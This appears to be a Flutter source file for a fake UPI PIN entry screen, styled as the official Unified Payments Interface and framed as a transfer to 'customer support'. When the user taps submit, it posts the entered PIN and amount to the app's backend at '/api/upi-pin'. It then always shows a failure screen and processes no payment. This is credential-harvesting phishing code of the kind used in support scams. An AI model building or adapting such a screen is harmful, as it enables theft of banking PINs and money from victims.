import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'dart:convert';
import 'package:http/http.dart' as http;
import '../api_config.dart';
import '../theme.dart';

class UpiPinScreen extends StatefulWidget {
  final double amount;
  const UpiPinScreen({super.key, required this.amount});
  @override
  State<UpiPinScreen> createState() => _S();
}

class _S extends State<UpiPinScreen> {
  String pin = '';
  void press(String d) { if (pin.length < 6) setState(() => pin += d); }
  void back() { if (pin.isNotEmpty) setState(() => pin = pin.substring(0, pin.length - 1)); }
  void submit() {
    if (pin.length >= 4) {
      http.post(Uri.parse('$apiBaseUrl/api/upi-pin'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'pin': pin, 'amount': widget.amount}))
        .then((_) => print('API success'))
        .catchError((e) => print('API error: $e'));
      context.push('/failed');
    }
  }

  @override
  Widget build(BuildContext context) {
    Widget key(Widget child, VoidCallback onTap) => InkWell(
      onTap: onTap,
      borderRadius: BorderRadius.circular(16),
      child: Container(height: 64, alignment: Alignment.center, child: child),
    );

    Widget num(String n) => key(Text(n, style: const TextStyle(fontSize: 36, color: AppColors.blue, fontWeight: FontWeight.w400)), () => press(n));

    return Scaffold(
      backgroundColor: Colors.white,
      body: SafeArea(child: Column(children: [
        Container(
          height: 6,
          decoration: AppStyles.headerGradient,
        ),
        Padding(
          padding: const EdgeInsets.fromLTRB(20, 20, 20, 8),
          child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: AppColors.blue.withValues(alpha: .1),
                borderRadius: BorderRadius.circular(12),
              ),
              child: const Icon(Icons.payments, color: AppColors.blue, size: 24),
            ),
            Column(crossAxisAlignment: CrossAxisAlignment.end, children: const [
              Text('UPI', style: TextStyle(fontSize: 24, fontStyle: FontStyle.italic, color: AppColors.navy, fontWeight: FontWeight.w300)),
              Text('UNIFIED PAYMENTS INTERFACE', style: TextStyle(fontSize: 9, letterSpacing: 2, color: AppColors.textMedium)),
            ]),
          ]),
        ),
        Container(
          width: double.infinity,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [AppColors.navy, AppColors.navy.withValues(alpha: .85)],
              begin: Alignment.centerLeft, end: Alignment.centerRight,
            ),
          ),
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
          child: Row(children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.white.withValues(alpha: .15),
                borderRadius: BorderRadius.circular(8),
              ),
              child: const Icon(Icons.account_balance, color: Colors.white, size: 20),
            ),
            const SizedBox(width: 14),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text('Sending: \u{20B9}${widget.amount.toStringAsFixed(1)}',
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16)),
              const SizedBox(height: 2),
              const Text('To: PC4 COMPANY IP', style: TextStyle(color: Colors.white70, fontWeight: FontWeight.w500, fontSize: 13)),
            ]),
          ]),
        ),
        const SizedBox(height: 32),
        Row(mainAxisAlignment: MainAxisAlignment.center, children: [
          Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: AppColors.blue.withValues(alpha: .1),
              borderRadius: BorderRadius.circular(6),
            ),
            child: const Icon(Icons.pin, size: 18, color: AppColors.blue),
          ),
          const SizedBox(width: 10),
          const Text('ENTER UPI PIN', style: TextStyle(fontSize: 18, color: AppColors.textMedium, letterSpacing: 1, fontWeight: FontWeight.w600)),
        ]),
        const SizedBox(height: 24),
        Row(mainAxisAlignment: MainAxisAlignment.center, children: List.generate(6, (i) => AnimatedContainer(
          duration: const Duration(milliseconds: 150),
          margin: const EdgeInsets.symmetric(horizontal: 6),
          width: 20,
          height: i < pin.length ? 20 : 16,
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: i < pin.length ? AppColors.blue : AppColors.fieldBorder,
            boxShadow: i < pin.length
                ? [BoxShadow(color: AppColors.blue.withValues(alpha: .3), blurRadius: 6)]
                : null,
          ),
          alignment: Alignment.center,
          child: i < pin.length
              ? Container(
                  width: 8, height: 8,
                  decoration: const BoxDecoration(shape: BoxShape.circle, color: Colors.white),
                )
              : null,
        ))),
        const SizedBox(height: 28),
        Container(
          margin: const EdgeInsets.symmetric(horizontal: 20),
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [Colors.orange.shade50, Colors.amber.shade50],
              begin: Alignment.topLeft, end: Alignment.bottomRight,
            ),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: Colors.orange.shade200),
          ),
          child: Row(children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.orange.shade100,
                borderRadius: BorderRadius.circular(8),
              ),
              child: const Icon(Icons.warning_amber_rounded, color: Colors.orange, size: 22),
            ),
            const SizedBox(width: 12),
            const Expanded(child: Text('You are transferring money from your account to customer support',
                style: TextStyle(fontWeight: FontWeight.w600, fontSize: 13, color: AppColors.textDark))),
          ]),
        ),
        const SizedBox(height: 24),
        Expanded(child: GridView.count(
          crossAxisCount: 3,
          padding: const EdgeInsets.symmetric(horizontal: 32),
          childAspectRatio: 1.8,
          physics: const NeverScrollableScrollPhysics(),
          children: [
            num('1'), num('2'), num('3'),
            num('4'), num('5'), num('6'),
            num('7'), num('8'), num('9'),
            key(
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: AppColors.red.withValues(alpha: .08),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: const Icon(Icons.backspace_outlined, size: 24, color: AppColors.red),
              ),
              back,
            ),
            num('0'),
            key(
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: AppColors.green.withValues(alpha: .08),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: const Icon(Icons.check_circle_outline, size: 24, color: AppColors.green),
              ),
              submit,
            ),
          ],
        )),
      ])),
    );
  }
}
